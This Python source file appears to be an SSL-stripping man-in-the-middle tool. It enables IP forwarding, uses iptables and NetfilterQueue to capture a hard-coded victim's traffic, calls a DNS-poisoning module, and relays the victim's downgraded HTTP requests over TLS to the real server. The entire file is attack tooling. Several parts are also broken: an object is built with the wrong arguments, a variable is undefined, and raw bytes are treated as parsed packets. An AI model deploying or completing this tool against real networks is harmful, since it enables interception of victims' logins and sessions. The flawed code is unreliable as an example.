from scapy.all import *
from netfilterqueue import NetfilterQueue
from scapy.layers.http import *
from scapy.layers.tls import *
from collections import deque
import os
import threading
import multiprocessing
import time

import dns_poisoning

load_layer("tls")    
load_layer("http")    

class PausableAutomaton(multiprocessing.Process):

    def __init__(self, host, ip_victim):

        multiprocessing.Process.__init__(self)
        self.automaton = TLSClientAutomaton.tlslink(HTTP, server=host, dport=443)
        self.ip_victim = ip_victim

        self.exit = multiprocessing.Event()

    def run(self):

        self.exit.clear()

        while not self.exit.is_set():

            packet = self.automaton.recv()

            if packet:
                send(IP(dst = self.ip_victim) / TCP() / packet)

    def send(self, packet):

        self.stop()
        self.automaton.send(HTTP(clsreq = packet))
        self.run()

    def stop(self):

        self.exit.set()

class SslRemover():

    def __init__(self, ip_victim, queue_num):

        self.ip_victim     = ip_victim
        self.queue         = NetfilterQueue()
        self.iprule_add    = "iptables -I INPUT -p tcp -s {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)
        self.iprule_remove    = "iptables -D INPUT -p tcp -s {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)
        self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
        self.thread.setDaemon(True)
        self.queue.bind(queue_num, self.handle_packet)
        self.tls_automata = {}

    def handle_packet(self, packet_nfqueue):
        
        packet_scapy = packet_nfqueue.get_payload()

        if packet_scapy.haslayer(HTTPRequest):
            self.handle_request(packet_scapy[HTTPRequest])

    def add_automaton(self, host):

        self.tls_automata[host] = PausableAutomaton(HTTP, server=host, dport=443)

    def get_automaton(self, host):

        try:
            return self.tls_automata[host]

        except KeyError as _:
            return None

    def handle_request(self, packet):

        tls_automaton = self.get_automaton(packet.Host)

        if tls_automaton:
            tls_automaton.send(clsreq = packet)

        else:
            self.add_automaton(packet.Host)
            self.tls_automata[host].send(packet)

    def start(self):

        os.system(self.iprule_add)
        self.thread.start()   

        print "SSL stripping started"

    def stop(self):

        os.system(self.iprule_remove)    
        self.queue.unbind()    

        print "SSL stripping stopped"

def test_cb():

    dns_poisoning.test()

    ip_victim = "10.0.123.5"

    ssl_remover = SslRemover(ip_victim, 2)

    ssl_remover.start()
    time.sleep(20)
    ssl_remover.stop()

def test():

    thread = threading.Thread(target=test_cb)
    thread.run()

if __name__ == "__main__":

    import os
    os.system("sysctl -w net.ipv4.ip_forward=1")
    os.system("iptables -P FORWARD ACCEPT")

    test()
